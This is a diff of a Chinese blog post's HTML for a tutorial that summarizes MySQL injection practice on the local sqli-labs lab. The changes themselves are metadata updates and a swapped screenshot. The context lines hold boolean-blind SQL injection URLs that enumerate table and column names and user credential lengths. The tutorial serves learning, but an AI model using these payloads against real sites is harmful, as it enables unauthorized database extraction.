@@ -88,8 +88,9 @@
 <meta property="og:description" content="本篇基于注入天书的例子进行总结 前几天无聊看到学校群里的新生曾讨论过sql注入 突然想到自己对sql注入的理解也是比较浅的层面 所以才想总结一下 注入较杂 较乱 水平有限不足之处还望师傅们指点。">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="https://i.loli.net/2019/03/10/5c84cc486773d.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/03/11/5c864d60e0dd5.png">
 <meta property="og:image" content="https://i.loli.net/2019/03/11/5c8648ace9cdf.png">
-<meta property="og:updated_time" content="2019-03-11T11:55:51.000Z">
+<meta property="og:updated_time" content="2019-03-11T11:59:35.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="基于注入天书的mysql注入总结">
 <meta name="twitter:description" content="本篇基于注入天书的例子进行总结 前几天无聊看到学校群里的新生曾讨论过sql注入 突然想到自己对sql注入的理解也是比较浅的层面 所以才想总结一下 注入较杂 较乱 水平有限不足之处还望师傅们指点。">
@@ -467,12 +468,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/less-5/?id=1%27and%20ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()limit%201,1),1,1))=114--+</span><br></pre></td></tr></table></figure>
 <p>后面依次类推</p>
 <p>到这里我们就获取到了<code>security</code>数据库下 也就是当前数据库下的所有表名</p>
-<ul>
-<li>emails</li>
-<li>referers</li>
-<li>uagents</li>
-<li>users</li>
-</ul>
+<p><img src="https://i.loli.net/2019/03/11/5c864d60e0dd5.png" alt="屏幕快照 2019-03-11 下午7.58.11.png"></p>
 <h4 id="列名"><a href="#列名" class="headerlink" title="列名"></a>列名</h4><p>来看users表下的列</p>
 <p>首先还是和表类似猜测users表下列的个数</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/less-5/?id=1%27and%20(select%20count(column_name)from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=%22users%22)=3--+</span><br></pre></td></tr></table></figure>
@@ -493,10 +489,10 @@
 <h4 id="数据"><a href="#数据" class="headerlink" title="数据"></a>数据</h4><p>得到列首先判断users表中有多少条记录</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/less-5/?id=1&apos;and (select count(*) from users)=13--+</span><br></pre></td></tr></table></figure>
 <p>判断出users表里13条数据信息</p>
-<p>紧着着判断 13条数据第一条数据的长度</p>
 <p>下图 是users表下的内容 </p>
 <p>对比笔记看起来更直观吧</p>
 <p><img src="https://i.loli.net/2019/03/11/5c8648ace9cdf.png" alt="屏幕快照 2019-03-11 下午7.37.59.png"></p>
+<p>紧着着判断 13条数据第一条数据的长度</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/less-5/?id=1&apos;and (select length(username) from users limit 0,1)=4 --+</span><br></pre></td></tr></table></figure>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/less-5/?id=1&apos;and (select length(password) from users limit 0,1)=4 --+</span><br></pre></td></tr></table></figure>
 <p>后面还是依次类推</p>
